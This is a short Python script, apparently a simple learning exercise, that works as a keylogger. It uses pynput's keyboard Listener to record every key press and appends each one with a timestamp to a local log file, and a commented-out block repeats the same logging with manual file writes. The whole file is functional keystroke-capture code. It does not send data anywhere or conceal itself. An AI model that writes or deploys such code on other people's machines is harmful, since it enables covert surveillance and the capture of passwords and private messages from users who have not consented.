from pynput.keyboard import Key, Listener
import logging
from os.path import exists
from datetime import datetime

fileName = '1.txt'
# Not passing this to the function on_press because it is used by the Listener which needs a particular call pattern.

def on_press(key):
    # Can have a different way to log things without timestamp or something.
    # Used by the main logging function.
    # Tells the Listener what to do when it encounters the event.
    
    
    logging.info(str(key))
    # We use the logging module to log with the timestamp directly.
    
    '''
    # The way it can be done without the logging module.
    # Here we use time and os module functions.
    
    global fileName
    f = None # To ensure that scope related problems do not come.
    if not exists(fileName):
        f = open(fileName, 'w')    
    else: 
        f = open(fileName, 'a')
    f.write(str(datetime.now()) + ': ')

    f.write(str(key) + '\n')
    # Writting without timestamp.
    f.close()
    '''

# This function does the key logging.
# @param: fileName. 
def startKeyLogging(fileName):
    logging.basicConfig(filename=fileName, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    with Listener(on_press=on_press) as listener:
        listener.join()
